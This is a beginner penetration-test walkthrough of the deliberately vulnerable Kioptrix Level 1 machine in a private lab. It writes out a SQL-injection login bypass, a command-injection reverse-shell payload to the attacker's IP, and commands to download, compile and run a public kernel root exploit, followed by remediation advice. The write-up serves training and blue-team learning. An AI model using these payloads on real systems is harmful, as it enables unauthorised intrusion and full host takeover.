# Kioptrix Level 1 — Penetration Test Write-up

A complete, beginner-friendly walkthrough of compromising the **Kioptrix Level 1** vulnerable machine (VulnHub) in an isolated home lab. It documents the full offensive-security methodology from start to finish: **reconnaissance → enumeration → exploitation → privilege escalation → root**, and finishes with defensive lessons for blue-team work.

> **Legal & Ethical Notice:** All activity was performed against a deliberately vulnerable practice VM on a private, isolated lab network. Only private RFC-1918 addresses (192.168.x.x) are involved. Never test systems you do not own or lack explicit written permission to test.

---

## Table of Contents

1. [What is Kioptrix Level 1?](#what-is-kioptrix-level-1)
2. [Lab Setup](#lab-setup)
3. [Step 1 — Host Discovery](#step-1--host-discovery)
4. [Step 2 — Service & OS Enumeration](#step-2--service--os-enumeration)
5. [Step 3 — Initial Access (Web Exploitation)](#step-3--initial-access--web-application-exploitation)
6. [Step 4 — Privilege Escalation to Root](#step-4--privilege-escalation--linux-kernel-exploit-cve-2009-2692)
7. [Alternative Path — Samba trans2open](#alternative-path--samba-trans2open-cve-2003-0201)
8. [Attack Chain Summary](#attack-chain-summary)
9. [Remediation Recommendations](#remediation-recommendations)
10. [What I Learned](#what-i-learned)

---

## What is Kioptrix Level 1?

Kioptrix Level 1 is one of the most popular beginner boot-to-root machines on VulnHub, widely used for OSCP preparation. The goal is to gain `root` (full administrative control) on the target starting from nothing but network access. It runs an old CentOS-based Linux system with several outdated, intentionally vulnerable services, which makes it a great box for learning the full penetration-testing workflow.

---

## Lab Setup

| Role | Host | IP |
|------|------|----|
| Attacker | Kali Linux | 192.168.1.64 |
| Target | Kioptrix Level 1 | 192.168.1.99 |

**Tools used:** netdiscover, Nmap, searchsploit, Python HTTP server, wget, gcc, netcat.

---

## Step 1 — Host Discovery

The first step is finding the target on the network. I used ARP-based scanning with **netdiscover**, which listens for ARP replies to map live hosts on the local subnet, and identified the target at `192.168.1.99`.

![Host discovery with netdiscover](01-host-discovery.png)

---

## Step 2 — Service & OS Enumeration

With the target located, I enumerated its open ports, running services, and operating system using an Nmap version + OS-detection scan:

```bash
nmap -sV -O 192.168.1.99
```

**Key findings:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 3.9p1 (protocol 1.99) |
| 80/tcp | http | Apache httpd 2.0.52 (CentOS) |
| 111/tcp | rpcbind | RPC #100000 |
| 443/tcp | ssl/http | Apache httpd 2.0.52 (CentOS) |
| 631/tcp | ipp | CUPS 1.1 |
| 3306/tcp | mysql | MySQL |

**OS detection:** Linux kernel 2.6.9 – 2.6.30 (CentOS).

These are all old versions, which immediately flags them as likely vulnerable. The ancient Apache/OpenSSH builds and the legacy Linux 2.6 kernel are the biggest clues about where to attack.

![Nmap service and OS scan](02-nmap-scan.png)

---

## Step 3 — Initial Access — Web Application Exploitation

The web server (port 80) exposed a **Remote System Administration Login** page. Login forms that build SQL queries from raw user input are often vulnerable to **SQL injection**. I bypassed authentication with a classic payload:

```sql
admin' or 1=1 #
```

This tricks the query into always evaluating as true, logging me in without valid credentials.

![SQL injection on the login form](03-sql-injection.png)

That granted access to a **Basic Administrative Web Console**. Its "Ping a Machine on the Network" feature passed user input straight to a shell command, making it vulnerable to **command injection**. I abused it to spawn a reverse shell back to my attacker machine:

```bash
| sh -i >& /dev/tcp/192.168.1.64/4444 0>&1
```

![Command injection reverse shell payload](04-command-injection.png)

A netcat listener on the attacker machine caught the incoming connection, giving me a low-privilege shell on the target:

```bash
nc -lvnp 4444
```

---

## Step 4 — Privilege Escalation — Linux Kernel Exploit (CVE-2009-2692)

The shell ran as a low-privileged web user, so the next goal was **root**. The outdated Linux 2.6 kernel found during enumeration is affected by the well-known **sock_sendpage()** local privilege-escalation vulnerability (**CVE-2009-2692**).

I located the matching exploit locally with **searchsploit**:

```bash
searchsploit -m linux/local/9545.c   # CVE-2009-2692 / EDB-9545
```

![Locating the exploit with searchsploit](05-searchsploit.png)

Then I hosted the exploit on the attacker box over HTTP and transferred, compiled, and ran it on the target through the reverse shell:

```bash
# On attacker (Kali)
python3 -m http.server 8000

# On target (via reverse shell)
cd /tmp
wget 192.168.1.64:8000/9545.c
gcc -o exploit 9545.c
chmod +x exploit
./exploit
whoami        # => root
```

The exploit succeeded, escalating from a limited web shell to **root** — full compromise of the host.

![Privilege escalation to root](06-privesc-root.png)

---

## Alternative Path — Samba trans2open (CVE-2003-0201)

Kioptrix Level 1 is also famous for a second, entirely different route to root through its old **Samba** service. Older Samba 2.2.x builds are vulnerable to the **trans2open** buffer-overflow (**CVE-2003-0201 / OSVDB-8306**), which can be exploited (e.g., via a Metasploit module or a public exploit) to get a **root shell directly**, with no privilege-escalation step needed.

I documented the web-app → kernel-exploit path above because that is the route I performed, but it is worth knowing both paths exist: the Samba route is often the "intended"/quickest solution, while the web + kernel-exploit route demonstrates a broader chain of techniques.

---

## Attack Chain Summary

Starting from an unauthenticated network position, the target was fully compromised:

```
reconnaissance -> service enumeration -> web app exploitation (SQLi + command injection)
-> reverse shell -> kernel privilege escalation (CVE-2009-2692) -> root
```

---

## Remediation Recommendations

- **Patch aggressively:** upgrade the Linux kernel, Apache, and Samba to remove known CVEs (e.g., CVE-2009-2692, CVE-2003-0201).
- **Fix SQL injection:** use parameterized queries / prepared statements; never build SQL from raw user input.
- **Fix command injection:** validate and sanitize all input, avoid passing user input to shell commands, and use safe APIs instead of shelling out.
- **Least privilege & segmentation:** restrict and network-segment administrative interfaces, and run services as non-root where possible.
- **Disable unused services:** close ports/services (e.g., legacy RPC, CUPS, Samba) that aren't required.

---

## What I Learned

Working through the full attack chain deepened my understanding of attacker tactics, techniques, and procedures (TTPs). This directly strengthens my SOC / blue-team work — understanding how an intrusion actually unfolds makes alert triage, log analysis, and threat detection far sharper.

---

*Written by Prashant Sapkota. Performed in a legal, isolated home lab for educational purposes.*
